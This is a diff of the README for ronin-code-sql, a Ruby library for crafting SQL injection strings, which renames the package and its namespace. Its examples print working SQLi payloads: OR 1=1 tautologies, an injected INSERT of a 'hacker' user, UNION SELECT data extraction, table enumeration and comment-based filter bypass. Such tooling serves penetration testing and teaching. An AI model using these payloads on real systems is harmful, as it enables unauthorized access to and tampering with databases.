@@ -1,18 +1,18 @@
-# ronin-sql
+# ronin-code-sql
 
-[![CI](https://github.com/ronin-rb/ronin-sql/actions/workflows/ruby.yml/badge.svg)](https://github.com/ronin-rb/ronin-sql/actions/workflows/ruby.yml)
-[![Code Climate](https://codeclimate.com/github/ronin-rb/ronin-sql.svg)](https://codeclimate.com/github/ronin-rb/ronin-sql)
+[![CI](https://github.com/ronin-rb/ronin-code-sql/actions/workflows/ruby.yml/badge.svg)](https://github.com/ronin-rb/ronin-code-sql/actions/workflows/ruby.yml)
+[![Code Climate](https://codeclimate.com/github/ronin-rb/ronin-code-sql.svg)](https://codeclimate.com/github/ronin-rb/ronin-code-sql)
 
-* [Source](https://github.com/ronin-rb/ronin-sql)
-* [Issues](https://github.com/ronin-rb/ronin-sql/issues)
-* [Documentation](https://ronin-rb.dev/docs/ronin-sql/frames)
+* [Source](https://github.com/ronin-rb/ronin-code-sql)
+* [Issues](https://github.com/ronin-rb/ronin-code-sql/issues)
+* [Documentation](https://ronin-rb.dev/docs/ronin-code-sql/frames)
 * [Slack](https://ronin-rb.slack.com) |
   [Discord](https://discord.gg/6WAb3PsVX9) |
   [Twitter](https://twitter.com/ronin_rb)
 
 ## Description
 
-{Ronin::SQL} is a Ruby DSL for crafting [SQL Injections (SQLi)][SQLi].
+{Ronin::Code::SQL} is a Ruby DSL for crafting [SQL Injections (SQLi)][SQLi].
 
 ### Features
 
@@ -58,7 +58,7 @@ string.sql_decode
 Injecting a `1=1` test into a Integer comparison:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.or { 1 == 1 }
 puts sqli
 # 1 OR 1=1
@@ -67,7 +67,7 @@ puts sqli
 Injecting a `1=1` test into a String comparison:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new(escape: :string)
+sqli = Ronin::Code::SQL::Injection.new(escape: :string)
 sqli.or { string(1) == string(1) }
 puts sqli
 # 1' OR '1'='1
@@ -76,7 +76,7 @@ puts sqli
 Columns:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.and { admin == 1 }
 puts sqli
 # 1 AND admin=1
@@ -85,7 +85,7 @@ puts sqli
 Clauses:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.or { 1 == 1 }.limit(0)
 puts sqli
 # 1 OR 1=1 LIMIT 0
@@ -94,7 +94,7 @@ puts sqli
 Statements:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.and { 1 == 0 }
 sqli.insert.into(:users).values('hacker','passw0rd','t')
 puts sqli
@@ -104,7 +104,7 @@ puts sqli
 Sub-Statements:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.union { select(1,2,3,4,id).from(users) }
 puts sqli
 # 1 UNION SELECT (1,2,3,4,id) FROM users
@@ -113,7 +113,7 @@ puts sqli
 Test if a table exists:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.and { select(count).from(:users) == 1 }
 puts sqli
 # 1 AND (SELECT COUNT(*) FROM users)=1
@@ -122,7 +122,7 @@ puts sqli
 Create errors by using non-existant tables:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new(escape: :string)
+sqli = Ronin::Code::SQL::Injection.new(escape: :string)
 sqli.and { non_existant_table == '1' }
 puts sqli
 # 1' AND non_existant_table='1
@@ -131,7 +131,7 @@ puts sqli
 Dumping all values of a column:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new(escape: :string)
+sqli = Ronin::Code::SQL::Injection.new(escape: :string)
 sqli.or { username.is_not(null) }.or { username == '' }
 puts sqli
 # 1' OR username IS NOT NULL OR username='
@@ -140,7 +140,7 @@ puts sqli
 Enumerate through database table names:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.and {
   ascii(
     lower(
@@ -157,7 +157,7 @@ puts sqli
 Find user supplied tables via the `sysObjects` table:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.union_all {
   select(1,2,3,4,5,6,name).from(sysObjects).where { xtype == 'U' }
 }
@@ -168,7 +168,7 @@ puts sqli.to_sql(terminate: true)
 Bypass filters using `/**/` instead of spaces:
 
 ```ruby
-sqli = Ronin::SQL::Injection.new
+sqli = Ronin::Code::SQL::Injection.new
 sqli.union { select(1,2,3,4,id).from(users) }
 puts sqli.to_sql(space: '/**/')
 # 1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users
@@ -182,27 +182,27 @@ puts sqli.to_sql(space: '/**/')
 ## Install
 
 ```shell
-$ gem install ronin-sql
+$ gem install ronin-code-sql
 ```
 
 ## License
 
-Ronin SQL - A Ruby DSL for crafting SQL Injections.
+ronin-code-sql - A Ruby DSL for crafting SQL Injections.
 
 Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
 
-ronin-sql is free software: you can redistribute it and/or modify
+ronin-code-sql is free software: you can redistribute it and/or modify
 it under the terms of the GNU Lesser General Public License as published
 by the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
-ronin-sql is distributed in the hope that it will be useful,
+ronin-code-sql is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU Lesser General Public License for more details.
 
 You should have received a copy of the GNU Lesser General Public License
-along with ronin-sql.  If not, see <https://www.gnu.org/licenses/>.
+along with ronin-code-sql.  If not, see <https://www.gnu.org/licenses/>.
 
 [SQLi]: http://en.wikipedia.org/wiki/SQL_injection
 
